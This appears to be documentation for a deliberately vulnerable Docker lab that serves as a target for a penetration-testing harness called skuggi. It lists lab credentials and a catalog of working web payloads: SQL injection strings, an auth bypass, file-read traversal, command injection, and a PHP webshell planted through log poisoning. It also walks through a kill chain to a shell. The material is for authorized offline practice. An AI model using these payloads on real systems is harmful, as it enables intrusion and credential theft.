# The practice lab

A self-contained, **deliberately vulnerable** target network you can point
skuggi at. It gives the harness a lawful, offline engagement to exercise
end-to-end: recon → scan → enumerate → inject → shell → loot. Everything lives
under [../lab/](../lab/) and is driven by Docker Compose.

> ⚠️ **Safety.** This stack is intentionally insecure. Run it only on a machine
> you control, only for authorized/offline practice. The published ports bind to
> `127.0.0.1` only — never expose it to a routable interface. The network uses
> `192.0.2.0/24` (IANA **TEST-NET-1**, reserved for documentation), so a stray
> route cannot collide with real infrastructure. All credentials below are lab
> credentials and are meant to be found.

## Topology

```
  host (skuggi operator)                       lab bridge network  lab-net  192.0.2.0/24
  ┌─────────────────────────┐   WireGuard (udp 51820, macOS fallback)  ┌──────────────────────────┐
  │  uv run skuggi           │◀──────── tunnel / direct route ────────▶│ wg-gw   192.0.2.2         │
  │  scope.json → 192.0.2.*  │                                         │ (masquerades onto lab-net)│
  └─────────────────────────┘   Linux: direct bridge route, no WG      ├──────────────────────────┤
        │ 127.0.0.1:8080 → 80 (convenience)                            │ web     192.0.2.10        │
        │ 127.0.0.1:3306 → 3306                                        │  Apache/PHP  :80          │
        └─────────────────────────────────────────────────────────────│  MariaDB     :3306        │
                                                                        │  (same host)              │
                                                                        └──────────────────────────┘
   future hosts: 192.0.2.11, .12 … (add a compose service, pin ipv4_address)
```

## Host inventory

| Host    | IP           | Services                        | Notes |
|---------|--------------|---------------------------------|-------|
| `web`   | `192.0.2.10` | Apache/PHP `:80`, MariaDB `:3306` | the vulnerable blog + its database, co-located on one host |
| `wg-gw` | `192.0.2.2`  | WireGuard `udp 51820`           | reachability gateway; only present when the WireGuard overlay is up |
| gateway | `192.0.2.1`  | —                               | the bridge gateway Docker assigns |

## Bring it up

```sh
cd lab
cp .env.example .env
docker compose up -d --build          # build the web host, start Apache + MariaDB
docker compose ps                     # wait for `web` to be healthy
```

Sanity check from the host:

```sh
curl -s http://127.0.0.1:8080/ | head
```

Tear down (removes the DB volume too):

```sh
docker compose down -v
```

## Reaching the lab by IP

The lab is a real network with defined IPs. How you reach those IPs depends on
the platform:

- **Linux.** The `lab-net` bridge is directly routable from the host — no tunnel
  needed. `nmap 192.0.2.0/24` and `nmap -sV 192.0.2.10` just work.
- **macOS / Docker Desktop.** Container IPs are not routable from the host, so
  bring up the WireGuard overlay and connect the host as a peer:

  ```sh
  cd lab
  docker compose -f docker-compose.yml -f wireguard/docker-compose.wg.yml up -d
  # client config (with private key) is generated here:
  cat wireguard/config/peer1/peer1.conf
  ```

  Import `peer1.conf` into the WireGuard app (its `Endpoint` is `127.0.0.1:51820`
  and its `AllowedIPs` is `192.0.2.0/24`), activate the tunnel, then:

  ```sh
  ping 192.0.2.10
  nmap -sV 192.0.2.10
  ```

For a quick look without any of that, the web app is always at
`http://127.0.0.1:8080/` and MySQL at `127.0.0.1:3306`.

## Accounts and credentials (all intentionally weak)

Application users — passwords are **unsalted md5**, so they crack instantly from
a wordlist once you dump the hashes:

| User    | Password      | Role  | md5 hash |
|---------|---------------|-------|----------|
| `admin` | `password123` | admin | `482c811da5d5b4bc6d497ffa98491e38` |
| `alice` | `letmein`     | user  | `0d107d09f5bbe40cade3de5c71e9e9b7` |
| `bob`   | `qwerty`      | user  | `d8578edf8458ce06fbc5bb76a58c5ca4` |
| `carol` | `iloveyou`    | user  | `f25a2fc72690b780b2a14e140ef6a9e0` |

Database accounts (MariaDB on `192.0.2.10:3306`):

| User       | Password      | Scope |
|------------|---------------|-------|
| `bloguser` | `blogpass123` | the `blog` database (used by the app) |
| `root`     | `toor`        | full, remotely usable — extra loot for `hydra`/`nmap` mysql-brute |

## Vulnerability catalog

Every endpoint is under `http://192.0.2.10/` (or `http://127.0.0.1:8080/`). Source
lives in [../lab/web/app/](../lab/web/app/).

| Class | Endpoint | Exploit |
|-------|----------|---------|
| **Param enumeration** | `?id=`, `?uid=`, `?page=`, `?file=` | predictable params; fuzz with `ffuf`/`gobuster`. `robots.txt` leaks `/admin/`, `/backup/`, `/uploads/`. |
| **IDOR** (posts) | `post.php?id=N` | no visibility check → enumerate ids to read the `draft` (id 4) and `private` (id 5) posts. |
| **IDOR** (users) | `profile.php?uid=N` | any user's email + role, unauthenticated. |
| **SQLi** (numeric) | `post.php?id=` | `?id=0 UNION SELECT 1,username,password,4,email,6,7 FROM users-- -` |
| **SQLi** (string) | `search.php?q=` | `?q=zzz' UNION SELECT id,username,password FROM users-- -` — `sqlmap`-friendly. |
| **SQLi** (auth bypass) | `login.php` | username `admin'-- -`, any password → admin session. |
| **LFI / file read** | `download.php?file=` | `?file=../../../../etc/passwd` |
| **LFI** (include) | `index.php?page=` | `?page=../../../etc/passwd`; or log-poison → RCE (below). |
| **RCE** (cmd injection) | `admin/ping.php?host=` | `?host=127.0.0.1;id` (admin session required). |
| **RCE** (upload) | `admin/upload.php` | upload `shell.php`, then `GET /uploads/shell.php?c=id` (admin session required). |
| **RCE** (LFI + log poisoning) | `index.php?page=` | send `User-Agent: <?php system($_GET['c']); ?>`, then `?page=../../../var/log/apache2/access.log&c=id`. |
| **Sensitive file exposure** | `/backup/db_dump.sql` | downloadable full dump with every password hash. |

### Worked kill chain

1. **Recon** the surface — `nmap -sV 192.0.2.10`, `whatweb`, `gobuster`/`robots.txt`.
2. **Loot the hashes** two ways: grab `curl -O http://192.0.2.10/backup/db_dump.sql`,
   or dump via SQLi (`sqlmap -u 'http://192.0.2.10/search.php?q=1' --dump -T users`).
3. **Crack** with `john`/`hashcat` (raw-md5) → `admin:password123`.
4. **Authenticate** — log in as `admin` (or skip cracking with the `admin'-- -`
   SQLi bypass) to reach the admin area.
5. **Get a shell** — `admin/ping.php?host=127.0.0.1;id`, or upload a webshell.

## Driving it with skuggi

A ready engagement scope is committed at [../lab/scope.json](../lab/scope.json):
it authorizes `192.0.2.0/24` and `web.lab`, the tools the lab is meant to be
attacked with, and every method those tools declare (see
[src/skuggi/templates/tools.example.json](../src/skuggi/templates/tools.example.json)). Copy it into an
engagement workspace and go:

```sh
cd /Users/janschupke/dev/skuggi
mkdir -p engagements/lab
cp lab/scope.json engagements/lab/scope.json
export SKUGGI_ENGAGEMENT=lab
uv run skuggi
```

```
🐐 ~ %  /skuggi scan the web host        # → proposes an in-scope nmap 192.0.2.10
🐐 ~ %  /skuggi enumerate the blog for injectable parameters
```

The guard ([src/skuggi/engagement.py](../src/skuggi/engagement.py)) permits a
command only when every extracted target falls inside `target_networks` /
`allowed_hosts`, so `nmap 192.0.2.10` passes while `nmap 8.8.8.8` is denied —
a quick way to confirm the boundary is live.

**A note on target extraction.** The guard classifies bare IPs/hostnames and
the host inside a URL — including a URL that follows a registry `target_flag`
(`-u`, `-h`, `-H`): the host is extracted before the scope check, so
`sqlmap -u http://192.0.2.10/…` and `gobuster -u http://192.0.2.10` pass while
`sqlmap -u http://8.8.8.8/…` is denied. A flag-forced value that is *not* a URL
or IP (`hydra -t localhost`) is still forced verbatim as a target. `nmap`,
`curl`, and flag-with-bare-IP tools (`nikto -h 192.0.2.10`, `hydra … 192.0.2.10`)
pass cleanly too.

> On macOS the WireGuard tunnel must be active for skuggi (running on the host)
> to actually reach `192.0.2.10`; on Linux the bridge is routable directly.

## Automated e2e

The lab is also the target for the **L5 e2e** test layer
([tests/e2e/](../tests/e2e/), see [docs/testing.md](testing.md)). It drives the
real pipeline — the engagement guard, the tool registry, the ledger, and the
real `skuggi.execution.run` subprocess — against the running lab with a scripted
worker (no LLM), and asserts on real output: the IDOR draft (`post.php?id=4`) is
readable, a SQLi UNION dumps the seeded admin md5, `nmap` sees the open port, an
out-of-scope command is still blocked while the app is live, and a `/report` is
produced from real findings.

```sh
cd lab && docker compose up -d --wait     # bring the lab up first
cd .. && make e2e                          # runs `pytest -m e2e --no-cov`
```

The layer is deselected by default and **skips cleanly** when the lab is down
(with a "bring it up" hint), so it is safe to leave in the default `pytest`
selection. It targets the loopback-published port (`127.0.0.1:<port>`, discovered
via `docker compose port web 80`), so it runs on macOS and Linux without
WireGuard; the direct-`192.0.2.10` variants run only when that IP is routable
(Linux, or macOS with the tunnel up) and skip otherwise.

## Adding more hosts later

The network is extensible. To add a second host:

1. Add a service block in [../lab/docker-compose.yml](../lab/docker-compose.yml)
   with its own `ipv4_address` in `192.0.2.0/24` (e.g. `192.0.2.11`).
2. Add a row to the **Host inventory** table above.

No scope or WireGuard changes are needed — `lab/scope.json`'s
`target_networks` and the tunnel's `AllowedIPs` already cover the whole `/24`.

## Layout

```
lab/
  docker-compose.yml           # lab-net (192.0.2.0/24) + the web host
  .env.example                 # subnet, published ports, WireGuard settings
  scope.json                   # ready-to-copy skuggi engagement scope
  web/
    Dockerfile                 # php:8.2-apache + mariadb-server + supervisor
    entrypoint.sh              # first-boot DB init/seed, then supervisord
    supervisord.conf           # runs mariadbd + apache2 (one host)
    apache-vhost.conf          # docroot, directory indexes, combined log
    mariadb-lab.cnf            # bind 0.0.0.0 so :3306 is a scannable service
    db/schema.sql  db/seed.sql # users/posts/comments/messages + seed data
    app/                       # the Goat CMS (vulnerable PHP)
  wireguard/
    docker-compose.wg.yml      # macOS reachability overlay (optional)
```
